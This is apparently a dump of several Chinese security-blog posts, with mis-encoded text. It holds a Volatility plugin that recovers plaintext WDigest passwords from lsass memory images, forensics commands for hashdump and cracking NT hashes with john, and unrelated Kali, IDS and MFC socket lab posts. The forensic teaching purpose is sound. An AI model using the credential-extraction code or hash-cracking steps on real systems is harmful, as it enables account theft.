self.get_first_entry() if entry: walk_num = 1 while walk_num &lt; self.MAX_WALK: self.add_entry(entry, found_at) self.entries_seen[found_at] = 1 found_at = entry.previous entry = self.get_entry_at(found_at) if not entry: debug.error(&#x27;Next entry not found!&#x27;) break if entry.this_entry in self.entries_seen: break walk_num += 1 class Wdigest_x86(Wdigest, Mimikatz_x86): &quot;&quot;&quot;TODO: add description.&quot;&quot;&quot; WDIGEST_LIST_ENTRY = construct.Struct(&#x27;WdigestListEntry&#x27;, construct.ULInt32(&#x27;previous&#x27;), construct.ULInt32(&#x27;next&#x27;), construct.ULInt32(&#x27;usage_count&#x27;), construct.ULInt32(&#x27;this_entry&#x27;), construct.ULInt64(&#x27;luid&#x27;), construct.ULInt64(&#x27;flag&#x27;), construct.ULInt16(&#x27;user_len&#x27;), construct.ULInt16(&#x27;user_max_len&#x27;), construct.ULInt32(&#x27;user_string_ptr&#x27;), construct.ULInt16(&#x27;domain_len&#x27;), construct.ULInt16(&#x27;domain_max_len&#x27;), construct.ULInt32(&#x27;domain_string_ptr&#x27;), construct.ULInt16(&#x27;password_len&#x27;), construct.ULInt16(&#x27;password_max_len&#x27;), construct.ULInt32(&#x27;password_encrypted_ptr&#x27;)) def __init__(self, lsass_task, credentials_obj): Mimikatz_x86.__init__(self, lsass_task) Wdigest.__init__(self, credentials_obj)class Wdigest_x64(Wdigest, Mimikatz_x64): &quot;&quot;&quot;TODO: add description.&quot;&quot;&quot; WDIGEST_LIST_ENTRY = construct.Struct(&#x27;WdigestListEntry&#x27;, construct.ULInt64(&#x27;previous&#x27;), construct.ULInt64(&#x27;next&#x27;), construct.ULInt32(&#x27;usage_count&#x27;), construct.ULInt32(&#x27;align1&#x27;), construct.ULInt64(&#x27;this_entry&#x27;), construct.ULInt64(&#x27;luid&#x27;), construct.ULInt64(&#x27;flag&#x27;), construct.ULInt16(&#x27;user_len&#x27;), construct.ULInt16(&#x27;user_max_len&#x27;), construct.ULInt32(&#x27;align2&#x27;), construct.ULInt64(&#x27;user_string_ptr&#x27;), construct.ULInt16(&#x27;domain_len&#x27;), construct.ULInt16(&#x27;domain_max_len&#x27;), construct.ULInt32(&#x27;align3&#x27;), construct.ULInt64(&#x27;domain_string_ptr&#x27;), construct.ULInt16(&#x27;password_len&#x27;), construct.ULInt16(&#x27;password_max_len&#x27;), construct.ULInt32(&#x27;align4&#x27;), construct.ULInt64(&#x27;password_encrypted_ptr&#x27;)) def __init__(self, lsass_task, credentials_obj): Mimikatz_x64.__init__(self, lsass_task) Wdigest.__init__(self, credentials_obj)class Wdigest_Vista_x86(Wdigest_x86): &quot;&quot;&quot;Class for Windows Vista x86.&quot;&quot;&quot; SIGNATURE = &#x27;\\x74\\x11\\x8b\\x0b\\x39\\x4e\\x10&#x27; FIRST_ENTRY_OFFSET = -6 def __init__(self, lsass_task, credentials_obj): Wdigest_x86.__init__(self, lsass_task, credentials_obj)class Wdigest_Win7_x86(Wdigest_x86): &quot;&quot;&quot;Class for Windows 7 x86.&quot;&quot;&quot; SIGNATURE = &#x27;\\x74\\x11\\x8b\\x0b\\x39\\x4e\\x10&#x27; FIRST_ENTRY_OFFSET = -6 def __init__(self, lsass_task, credentials_obj): Wdigest_x86.__init__(self, lsass_task, credentials_obj)class Wdigest_Win7_x64(Wdigest_x64): &quot;&quot;&quot;Class for Windows 7 x64.&quot;&quot;&quot; SIGNATURE = &#x27;\\x48\\x3b\\xd9\\x74&#x27; FIRST_ENTRY_OFFSET = -4 def __init__(self, lsass_task, credentials_obj): Wdigest_x64.__init__(self, lsass_task, credentials_obj)class Wdigest_Vista_x64(Wdigest_x64): &quot;&quot;&quot;Class for Windows Vista x64.&quot;&quot;&quot; SIGNATURE = &#x27;\\x48\\x3b\\xd9\\x74&#x27; FIRST_ENTRY_OFFSET = -4 def __init__(self, lsass_task, credentials_obj): Wdigest_x64.__init__(self, lsass_task, credentials_obj)#------------------------------------------------------------------------------ class mimikatz(commands.Command): &quot;&quot;&quot;mimikatz offline&quot;&quot;&quot; def __init__(self, config, *args, **kwargs): commands.Command.__init__(self, config, *args, **kwargs) self.profile = config.get_value(&#x27;profile&#x27;) self.credentials_obj = Credentials() def find_lsass(self): addr_space = utils.load_as(self._config) for task in tasks.pslist(addr_space): if str(task.ImageFileName) == &#x27;lsass.exe&#x27;: return task def init_objects(self, lsass_task): lsa_decryptor = None wdigest = None if len(self.profile) &gt;= 7: arch = self.profile[-3:] sp = self.profile[-6:-3] os = self.profile[:-6] if os == &#x27;Vista&#x27;: if arch == &#x27;x86&#x27;: lsa_decryptor = LsaDecryptor_Vista_x86(lsass_task) wdigest = Wdigest_Vista_x86(lsass_task, self.credentials_obj) elif arch == &#x27;x64&#x27;: lsa_decryptor = LsaDecryptor_Vista_x64(lsass_task) wdigest = Wdigest_Vista_x64(lsass_task, self.credentials_obj) elif os == &#x27;Win7&#x27;: if arch == &#x27;x86&#x27;: lsa_decryptor = LsaDecryptor_Win7_x86(lsass_task) wdigest = Wdigest_Win7_x86(lsass_task, self.credentials_obj) elif arch == &#x27;x64&#x27;: lsa_decryptor = LsaDecryptor_Win7_x64(lsass_task) wdigest = Wdigest_Win7_x64(lsass_task, self.credentials_obj) else: pass return lsa_decryptor, wdigest def calculate(self): lsass_task = self.find_lsass() if not lsass_task: debug.error(&#x27;lsass_task process not found!!&#x27;) return lsa_decryptor, wdigest = self.init_objects(lsass_task) if not lsa_decryptor or not wdigest: return lsa_decryptor.acquire_crypto_material() wdigest.walk_entries() for cred in self.credentials_obj.credentials: cred.decrypt_epwd(lsa_decryptor) def render_text(self, outfd, data): self.table_header(outfd, [(&quot;Module&quot;, &quot;8&quot;), (&quot;User&quot;, &quot;16&quot;), (&quot;Domain&quot;, &quot;16&quot;), (&quot;Password&quot;, &quot;40&quot;)]) for cred in self.credentials_obj.credentials: self.table_row( outfd, cred.module, cred.username, cred.domain, cred.pwd) æŠŠpyæ”¾è¿›volatilityæ–‡ä»¶å¤¹çš„pluginsæ–‡ä»¶å¤¹å†… 1python vol.py -f /root/æ¡Œé¢/suspicion/mem.vmem --profile=WinXPSP2x86 mimikatz ğŸ‘‰ä½¿ç”¨userassistå‘½ä»¤å¯ä»¥è·å–åˆ°å†…å­˜åœ¨è½¬å‚¨å‰éƒ½è¿è¡Œäº†å“ªäº›ç¨‹åºï¼Œè¿è¡Œå¤šå°‘æ¬¡ï¼Œæœ€åä¸€æ¬¡è¿è¡Œæ—¶é—´ ğŸ‘‰ä½¿ç”¨memdumpæŠŠæŸä¸ªç¨‹åºçš„ç›¸å…³æ•°æ®è½¬å‚¨æˆä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åå¯¹è¿™ä¸ªæ–‡ä»¶è¿›ä¸€æ­¥åˆ†æ memdump -p PID -D è½¬å‚¨æ–‡ä»¶çš„å­˜æ”¾ç›®å½• â€‹ pslistè·å–PID 1python vol.py -f /root/æ¡Œé¢/suspicion/mem.vmem memdump -p 1736 -D mem ğŸ‘‰æ–‡ä»¶æˆåŠŸç”Ÿæˆï¼Œç”¨editoræ‰“å¼€ ğŸ‘‰ç”¨strings å‘½ä»¤æå–æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸² 1strings 1736.dmp|grep flag | more |grep flag æ˜¯ä»¥flagä¸ºå…³é”®è¯è¿›è¡Œæœç´¢ | more æ˜¯é€é¡µæ˜¾ç¤ºæœç´¢ç»“æœ ğŸ‘‰ä½¿ç”¨cmdscanå‘½ä»¤ä»è½¬å‚¨å†…å®¹ä¸­æå–ç›®æ ‡ç³»ç»Ÿçš„å‘½ä»¤è¡Œå†å² 1python vol.py -f /root/æ¡Œé¢/suspicion/mem.vmem --profile=WinXPSP2x86 cmdscan ğŸ‘‰ä½¿ç”¨netscanæå–ç½‘ç»œè¿æ¥æƒ…å†µ ğŸ‘‰ä½¿ç”¨iehistoryæå–ä½¿ç”¨IEæµè§ˆå™¨è®¿é—®ç½‘ç»œæƒ…å†µ â€‹ volatilityè‡ªå¸¦çš„æ˜¯ieçš„ï¼Œä¹Ÿå¯ä»¥ä¸‹è½½å…¶ä»–çš„æ’ä»¶æ¥æå–å…¶ä»–æµè§ˆå™¨çš„æµè§ˆè®°å½• Tipï¼švolatilityå…¥é—¨æŒ‡ä»¤12345Volatility -f name imageinfovolatility -f name pslist --profile=WinXPSP2x86 åˆ—ä¸¾è¿›ç¨‹ï¼švolatility -f name --profile=WinXPSP2x86 volshelldt(&quot;_PEB&quot;) æŸ¥çœ‹è¿›ç¨‹ç¯å¢ƒå—volatility -f name --profile=WinXPSP2x86 hiveliståˆ—ä¸¾ç¼“å­˜åœ¨å†…å­˜çš„æ³¨å†Œè¡¨ ï¼š hivedumpæ‰“å°å‡ºæ³¨å†Œè¡¨ä¸­çš„æ•°æ® ï¼š 1volatility -f name --profile=WinXPSP2x86 hivedump -o æ³¨å†Œè¡¨çš„ virtual åœ°å€ æ˜¾ç¤ºæ¯ä¸ªè¿›ç¨‹çš„åŠ è½½dllåˆ—è¡¨ 1Volatility -f name -profile = Win7SP0x86 dlllist&gt; dlllist.txt è·å–SAMè¡¨ä¸­çš„ç”¨æˆ·ï¼š 1volatility -f name --profile=WinXPSP2x86 printkey -K &quot;SAM\\Domains\\Account\\Users\\Names&quot; ç™»é™†è´¦æˆ·ç³»ç»Ÿ 1volatility -f name --profile=WinXPSP2x86 printkey -K &quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; userassisté”®å€¼åŒ…å«ç³»ç»Ÿæˆ–æ¡Œé¢æ‰§è¡Œæ–‡ä»¶çš„ä¿¡æ¯ï¼Œå¦‚åç§°ã€è·¯å¾„ã€æ‰§è¡Œæ¬¡æ•°ã€æœ€åä¸€æ¬¡æ‰§è¡Œæ—¶é—´ç­‰ 1volatility -f name --profile=WinXPSP2x86 userassist å°†å†…å­˜ä¸­çš„æŸä¸ªè¿›ç¨‹æ•°æ®ä»¥ dmp çš„æ ¼å¼ä¿å­˜å‡ºæ¥ 1volatility -f name --profile=WinXPSP2x86 -p [PID] -D [dump å‡ºçš„æ–‡ä»¶ä¿å­˜çš„ç›®å½•] æå–å†…å­˜ä¸­ä¿ç•™çš„ cmd å‘½ä»¤ä½¿ç”¨æƒ…å†µ 1volatility -f name --profile=WinXPSP2x86 cmdscan è·å–åˆ°å½“æ—¶çš„ç½‘ç»œè¿æ¥æƒ…å†µ 1volatility -f name --profile=WinXPSP2x86 netscan è·å– IE æµè§ˆå™¨çš„ä½¿ç”¨æƒ…å†µ ï¼š 1volatility -f name --profile=WinXPSP2x86 iehistory è·å–å†…å­˜ä¸­çš„ç³»ç»Ÿå¯†ç ï¼Œå¯ä»¥ä½¿ç”¨ hashdump å°†å®ƒæå–å‡ºæ¥ 123volatility -f name --profile=WinXPSP2x86 hashdump -y ï¼ˆæ³¨å†Œè¡¨ system çš„ virtual åœ°å€ ï¼‰-s ï¼ˆSAM çš„ virtual åœ°å€ï¼‰volatility -f name --profile=WinXPSP2x86 hashdump -y 0xe1035b60 -s 0xe16aab60volatility -f name --profile=WinXPSP2x86 timeliner å¯¹æ–‡ä»¶æŸ¥æ‰¾åŠdumoæå–æŸä¸ªè¿›ç¨‹ï¼š 123volatility -f name --profile=Win7SP1x64 memdump -D . -p 2872strings -e l ./2872.dmp | grep flagvolatility -f name --profile=Win7SP1x64 dumpfiles -Q 0x000000007e410890 -n --dump-dir=./ HASHåŒ¹é…ç”¨æˆ·è´¦æˆ·åå¯†ç ï¼š 1Hash, ç„¶åä½¿ç”¨john filename --format=NTç ´è§£ å®‰å…¨è¿›ç¨‹æ‰«æ 1volatility -f name --profile=Win7SP1x64 psscan Flagå­—ç¬¦ä¸²æ‰«æï¼š 1strings -e l 2616.dmp | grep flag æŸ¥æ‰¾å›¾ç‰‡ï¼š 12volatility -f name--profile=Win7SP1x64 filescan | grep -E &#x27;jpg|png|jpeg|bmp|gifvolatility -f name --profile=Win7SP1x64 netscan æ³¨å†Œè¡¨è§£æ 12volatility -f name --profile=Win7SP1x64 hivelistvolatility -f name --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001\\Control;&quot; å¤åˆ¶ã€å‰ªåˆ‡ç‰ˆï¼š 12volatility -f name --profile=Win7SP1x64 clipboardvolatility -f name --profile=Win7SP1x64 dlllist -p 3820 Dumpæ‰€æœ‰è¿›ç¨‹ï¼š 123volatility -f name --profile=Win7SP1x64 memdump -n chrome -D .åˆ©ç”¨å­—ç¬¦ä¸²æŸ¥æ‰¾downloadpython vol.py -f name --profile=Win7SP1x86 shimcache svcscanæŸ¥çœ‹æœåŠ¡ 1python vol.py -f name --profile=Win7SP1x86 svcscan 123modules æŸ¥çœ‹å†…æ ¸é©±åŠ¨modscanã€driverscan å¯æŸ¥çœ‹ä¸€äº›éšè—çš„å†…æ ¸é©±åŠ¨ShimCacheæ¥è¯†åˆ«åº”ç”¨ç¨‹åºå…¼å®¹æ€§é—®é¢˜ã€‚è·Ÿè¸ªæ–‡ä»¶è·¯å¾„ï¼Œå¤§å°ï¼Œæœ€åä¿®æ”¹æ—¶é—´å’Œæœ€åâ€œæ‰§è¡Œâ€æ—¶é—´.","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"å…¥ä¾µæ£€æµ‹ä¸å–è¯","slug":"å®éªŒ/å…¥ä¾µæ£€æµ‹ä¸å–è¯","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"å–è¯","slug":"å–è¯","permalink":"https://gryffinbit.top/tags/%E5%8F%96%E8%AF%81/"},{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"volatility","slug":"volatility","permalink":"https://gryffinbit.top/tags/volatility/"}],"author":"Gryffinbit"},{"title":"kaliè™šæ‹Ÿæœºæ‰©å®¹","slug":"kaliè™šæ‹Ÿæœºæ‰©å®¹","date":"2020-12-05T10:34:17.000Z","updated":"2024-11-12T06:59:30.000Z","comments":true,"path":"2020/12/05/kaliè™šæ‹Ÿæœºæ‰©å®¹/","permalink":"https://gryffinbit.top/2020/12/05/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%AE%B9/","excerpt":"","text":"kaliè™šæ‹Ÿæœºæ‰©å®¹æ›´æ”¹å¤§å°åœ¨VMwareè®¾ç½®ä¸­æ‰©å±•è™šæ‹Ÿç£ç›˜å¤§å°Hard Diské€‰é¡¹ åœ¨kaliä¸­è°ƒæ•´åˆ†åŒº/bin/sh /usr/lib/udisks2/udisks2-inhibit /usr/sbin/gpartedbin è°ƒå‡ºå›¾å½¢ç•Œé¢çš„ç£ç›˜ç®¡ç† æœ€åå¯åŠ¨æ›´æ”¹ è§£å†³æ‰©å®¹åå¯åŠ¨æ…¢çš„é—®é¢˜åœ¨é‡å»ºswapåˆ†åŒºåï¼Œåˆ†åŒºä¸­çš„IDå‘ç”Ÿäº†å˜åŒ–ï¼Œå¯¼è‡´å¯åŠ¨çš„æ—¶å€™æ‰¾ä¸åˆ°åˆ†åŒºï¼Œéœ€è¦ç­‰å¾…ã€‚ä¿®å¤è¯¥é—®é¢˜ï¼Œé¦–å…ˆæ‰¾åˆ°ä¸¤ä¸ªåˆ†åŒºçš„UUID sudo blkid ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå°†UUIDéƒ½æ›¿æ¢ä¸ºä¸Šé¢æŸ¥è¯¢å‡ºæ¥çš„UUID vim /etc/fstab è¿›è¡Œä¿®æ”¹ vim /etc/initramfs-tools/conf.d/resume è¿›è¡Œä¿®æ”¹ è¿›è¡Œé‡å»º sudo update-initramfs -u","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"}],"author":"Gryffinbit"},{"title":"IDSè®¾å¤‡çš„é…ç½®å’Œä½¿ç”¨","slug":"IDSè®¾å¤‡çš„é…ç½®å’Œä½¿ç”¨","date":"2020-12-04T18:42:46.000Z","updated":"2024-11-12T06:59:40.000Z","comments":true,"path":"2020/12/05/IDSè®¾å¤‡çš„é…ç½®å’Œä½¿ç”¨/","permalink":"https://gryffinbit.top/2020/12/05/IDS%E8%AE%BE%E5%A4%87%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/","excerpt":"","text":"IDSè®¾å¤‡çš„é…ç½®å’Œä½¿ç”¨å®éªŒç›®çš„ï¼š ç†Ÿæ‚‰IDSè®¾å¤‡çš„éƒ¨ç½²æ–¹å¼ æŒæ¡è®¾å¤‡çš„è¿æ¥å’Œç®€å•è®¾ç½® å®éªŒç¯å¢ƒï¼šç‰©ç†ä¸»æœºï¼šmacOS Catalina è™šæ‹Ÿæœºï¼šWindows å®éªŒå†…å®¹ï¼š GNS3å®‰è£…ä¸åŸºæœ¬æ“ä½œ è·¯ç”±å™¨é…ç½® IDSé…ç½® å®éªŒè¿‡ç¨‹ï¼š ä¸€ã€GNS3å®‰è£…ä¸åŸºæœ¬æ“ä½œ ğŸ‘‰å®‰è£…GNS3ï¼ŒåŸºæœ¬é…ç½® R1ï¼Œpingè™šæ‹Ÿæœºï¼ŒæˆåŠŸ ğŸ‘‰æ¡¥æ¥æ¨¡å¼ ğŸ‘‰é…ç½®IDS è¿›è¡Œç½‘ç»œè”é€šçš„æ£€æµ‹ è™šæ‹Ÿæœºå’Œå®¿ä¸»æœºä¹‹é—´å¯ä»¥pingé€š è¿›è¡Œåˆå§‹ç™»é™† è¿›è¡Œé…ç½®ï¼Œå¼€å¯webæœåŠ¡ IDSå’Œè™šæ‹Ÿæœºå¯ä»¥åŒå‘pingé€š","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"å…¥ä¾µæ£€æµ‹ä¸å–è¯","slug":"å®éªŒ/å…¥ä¾µæ£€æµ‹ä¸å–è¯","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"GNS3","slug":"GNS3","permalink":"https://gryffinbit.top/tags/GNS3/"},{"name":"IDS","slug":"IDS","permalink":"https://gryffinbit.top/tags/IDS/"}],"author":"Gryffinbit"},{"title":"ç”¨CAsyncSocketç±»å®ç°èŠå¤©å®¤ç¨‹åº","slug":"ç”¨CAsyncSocketç±»å®ç°èŠå¤©å®¤ç¨‹åº","date":"2020-12-01T11:35:51.000Z","updated":"2024-11-12T06:59:54.000Z","comments":true,"path":"2020/12/01/ç”¨CAsyncSocketç±»å®ç°èŠå¤©å®¤ç¨‹åº/","permalink":"https://gryffinbit.top/2020/12/01/%E7%94%A8CAsyncSocket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"å®éªŒç›®æ ‡ç®€å•çš„èŠå¤©å®¤ç¨‹åºï¼Œé‡‡ç”¨C&#x2F;Sæ¨¡å‹ï¼Œåˆ†ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ç¨‹åºã€‚æ˜¯ç‚¹å¯¹ç‚¹é€šä¿¡çš„ç¨‹åºã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯é€šè¿‡ç½‘ç»œäº¤æ¢èŠå¤©çš„å­—ç¬¦ä¸²å†…å®¹ï¼Œå¹¶æ˜¾ç¤ºã€‚ å®éªŒç›®çš„ å­¦ä¹ å¦‚ä½•ä»CAsyncSocketç±»æ´¾ç”Ÿå‡ºè‡ªå·±çš„WinSockç±»ã€‚ ç†è§£WinSockç±»ä¸åº”ç”¨ç¨‹åºæ¡†æ¶çš„å…³ç³» å­¦ä¹ æµå¼å¥—æ¥å­—å¯¹è±¡çš„ä½¿ç”¨ å­¦ä¹ å¤„ç†ç½‘ç»œäº‹ä»¶çš„æ–¹æ³• äº†è§£MFCç¼–ç¨‹ å®éªŒç¯å¢ƒWindows10 x64ï¼ŒVisual Studio 2017 å®éªŒå†…å®¹åˆ†ä¸ºä¸¤å¤§å—ï¼Œåˆ›å»ºå®¢æˆ·ç«¯å’Œåˆ›å»ºæœåŠ¡å™¨ç«¯ã€‚ å®¢æˆ·ç«¯ ä½¿ç”¨MFC ApplicationWizardåˆ›å»ºå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºæ¡†æ¶ ä¸ºå¯¹è¯æ¡†ç•Œé¢æ·»åŠ æ§ä»¶å¯¹è±¡ ä¸ºå¯¹è¯æ¡†ä¸­çš„æ§ä»¶å¯¹è±¡å®šä¹‰ç›¸åº”çš„æˆå‘˜å˜é‡ åˆ›å»ºä»CAsynSocketç±»ç»§æ‰¿çš„æ´¾ç”Ÿç±» ä¸ºå¯¹è¯æ¡†ç±»æ·»åŠ æ§ä»¶å¯¹è±¡äº‹ä»¶çš„å“åº”å‡½æ•° ä¸ºCtalkcDlgå¯¹è¯æ¡†ç±»æ·»åŠ å…¶ä»–çš„æˆå‘˜å‡½æ•°å’Œæˆå‘˜å˜é‡ æ·»åŠ å…³äºæ§ä»¶å˜é‡çš„åˆå§‹åŒ–ä»£ç  æ·»åŠ äº‹ä»¶å‡½æ•°å’Œæˆå‘˜å‡½æ•°çš„ä»£ç  æœåŠ¡å™¨ç«¯ ä¸å®¢æˆ·ç«¯åŒç† å®éªŒåŸç†æœåŠ¡å™¨ç«¯ï¼š åˆ›å»ºä¸€ä¸ªå¥—æ¥å­— åˆ›å»ºSocketï¼Œç»‘å®šåˆ°æŒ‡å®šç«¯å£ å¯åŠ¨ç›‘å¬ï¼Œå‡†å¤‡å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ æ¥æ”¶è¿æ¥ æ¶ˆæ¯çš„ä¼ é€ å…³é—­å¥—æ¥å­— å®¢æˆ·ç«¯ï¼š åˆ›å»ºä¸€ä¸ªå¥—æ¥å­— åˆ›å»ºSocket è¯·æ±‚è¿æ¥æœåŠ¡å™¨ æ¶ˆæ¯çš„ä¼ é€ å…³é—­å¥—æ¥å­— å®éªŒè¿‡ç¨‹(ä»£ç åˆ†æï¼‰ğŸ‘‰åˆ›é€ ç¨‹åºæ¡†æ¶ ï¼ˆMFCåŸºäºå¯¹è¯æ¡†ï¼‰ ğŸ‘‰æ·»åŠ æ§ä»¶å¯¹è±¡ ğŸ‘‰æ·»åŠ æ§ä»¶æˆå‘˜å˜é‡ CSocketç±»ä»CAsynSocketç±»ç»§æ‰¿äº†è®¸å¤šæˆå‘˜å‡½æ•°ï¼Œå°è£…äº†Windowså¥—æ¥å­—åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£APIã€‚ åº”ç”¨ç¨‹åºç±»Ctalkc\\s Appå¯¹åº”æ–‡ä»¶VC++è‡ªåŠ¨ç”Ÿæˆ æ´¾ç”Ÿç±»CMySocketå¯¹åº”æ–‡ä»¶å¯¹CMySocketè¿›è¡Œå®šä¹‰ã€‚å®ƒæ˜¯ä»CAsynSocketç±»ç»§æ‰¿ä¸‹æ¥çš„æ´¾ç”Ÿç±»ï¼Œå°†Socketäº‹ä»¶ä¼ ç»™å¯¹è¯æ¡†ï¼Œä»¥ä¾¿æ‰§è¡Œç”¨æˆ·è‡ªå·±çš„äº‹ä»¶å¤„ç†å‡½æ•°ã€‚ 1class CMySocket:public CAsynSocket æ·»åŠ äº‹ä»¶å“åº”å‡½æ•°ï¼Œç”¨äºè¿æ¥ã€æ–­å¼€ã€å’Œæ¥æ”¶ æœåŠ¡å™¨ç«¯ï¼š âœï¸MySocket.h 12345678910111213141516171819202122#pragma once#include &lt;afxsock.h&gt;class CtalksDlg;////////////////////////////////class CMySocket : public CAsyncSocket&#123;public: CMySocket(); virtual ~CMySocket();public: virtual void OnAccept(int nErrorCode); virtual void OnClose(int nErrorCode); virtual void OnReceive(int nErrorCode);private: CtalksDlg* m_pDlg;public: void SetParent(CtalksDlg* pDlg);&#125;; âœï¸MySocket.cpp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &quot;talks.h&quot;#include &quot;pch.h&quot;#include &quot;MySocket.h&quot;#include &quot;talksDlg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#undef THIS_FILE#endif// CMySocketCMySocket::CMySocket()&#123; m_pDlg = NULL;&#125;CMySocket::~CMySocket()&#123; m_pDlg = NULL;&#125;void CMySocket::SetParent(CtalksDlg* pDlg)&#123; m_pDlg = pDlg;&#125;#if 0BEGIN_MESSAGE_MAP(CMySocket, CAsyncSocket)END_MESSAGE_MAP()#endif//CMySocket member functionsvoid CMySocket::OnAccept(int nErrorCode)&#123; if (nErrorCode == 0) m_pDlg-&gt;OnAccept();&#125;void CMySocket::OnClose(int nErrorCode)&#123; if (nErrorCode == 0) m_pDlg-&gt;OnClose();&#125;void CMySocket::OnReceive(int nErrorCode)&#123; if (nErrorCode == 0) m_pDlg-&gt;OnReceive();&#125; å®¢æˆ·ç«¯ï¼š âœï¸MySocket.h 12345678910111213141516171819202122#pragma once#include &lt;afxsock.h&gt;class CtalkcDlg;//////////////////////////////////CMySocket Ã€Ã ÂµÃ„Â¶Â¨Ã’Ã¥class CMySocket : public CAsyncSocket&#123;public: CMySocket(); virtual ~CMySocket();public: virtual void OnConnect(int nErrorCode); virtual void OnClose(int nErrorCode); virtual void OnReceive(int nErrorCode);private: CtalkcDlg* m_pDlg;public: void SetParent(CtalkcDlg* pDlg);&#125;; âœï¸MySocket.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &quot;talkc.h&quot;#include &quot;pch.h&quot;#include &quot;MySocket.h&quot;#include &quot;talkcDlg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#undef THIS_FILE#endif// CMySocketCMySocket::CMySocket()&#123; m_pDlg = NULL; &#125;CMySocket::~CMySocket()&#123; m_pDlg = NULL;&#125;void CMySocket::SetParent(CtalkcDlg* pDlg)&#123; // TODO: Ã”ÃšÂ´Ã‹Â´Â¦ÃŒÃ­Â¼Ã“ÃŠÂµÃÃ–Â´ÃºÃ‚Ã«. m_pDlg = pDlg;&#125;#if 0BEGIN_MESSAGE_MAP(CMySocket, CAsyncSocket)END_MESSAGE_MAP()#endif//CMySocket member functionsvoid CMySocket::OnConnect(int nErrorCode)&#123; // TODO: Ã”ÃšÂ´Ã‹ÃŒÃ­Â¼Ã“Ã—Â¨Ã“ÃƒÂ´ÃºÃ‚Ã«ÂºÃ/Â»Ã²ÂµÃ·Ã“ÃƒÂ»Ã¹Ã€Ã  if (nErrorCode == 0) m_pDlg -&gt; OnConnect(); &#125;void CMySocket::OnClose(int nErrorCode)&#123; // TODO: Ã”ÃšÂ´Ã‹ÃŒÃ­Â¼Ã“Ã—Â¨Ã“ÃƒÂ´ÃºÃ‚Ã«ÂºÃ/Â»Ã²ÂµÃ·Ã“ÃƒÂ»Ã¹Ã€Ã  if (nErrorCode == 0) m_pDlg-&gt;OnClose();&#125;void CMySocket::OnReceive(int nErrorCode)&#123; // TODO: Ã”ÃšÂ´Ã‹ÃŒÃ­Â¼Ã“Ã—Â¨Ã“ÃƒÂ´ÃºÃ‚Ã«ÂºÃ/Â»Ã²ÂµÃ·Ã“ÃƒÂ»Ã¹Ã€Ã  if (nErrorCode == 0) m_pDlg-&gt;OnReceive(); &#125; å¯¹è¯æ¡†ç±»CTalkDlgå¯¹åº”æ–‡ä»¶ä¸»è¦æ˜¯å¯¹æ§ä»¶å˜é‡çš„å£°æ˜å’Œå®šä¹‰ã€‚ æœåŠ¡å™¨ç«¯ï¼š âœï¸talksDlg.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// talksDlg.h: å¤´æ–‡ä»¶//#pragma once#include &quot;MySocket.h&quot;// CtalksDlg å¯¹è¯æ¡†class CtalksDlg : public CDialogEx&#123;// æ„é€ public: CtalksDlg(CWnd* pParent = nullptr); // æ ‡å‡†æ„é€ å‡½æ•°// å¯¹è¯æ¡†æ•°æ®#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_TALKS_DIALOG &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV æ”¯æŒ// å®ç°protected: HICON m_hIcon; // ç”Ÿæˆçš„æ¶ˆæ¯æ˜ å°„å‡½æ•° virtual BOOL OnInitDialog(); afx_msg void OnSysCommand(UINT nID, LPARAM lParam); afx_msg void OnPaint(); afx_msg HCURSOR OnQueryDragIcon(); DECLARE_MESSAGE_MAP()public: afx_msg void OnLbnSelchangeList2(); CButton m_btnListen; CString m_strServName; int m_nServPort; CString m_strMsg; CListBox m_listSent; CListBox m_listReceived; afx_msg void OnButtonClose(); afx_msg void OnButtonListen(); afx_msg void OnSendMsg(); CMySocket m_sListenSocket; CMySocket m_sConnectSocket; void OnClose(); void OnAccept(); void OnReceive();&#125;; âœï¸talksDlg.cpp 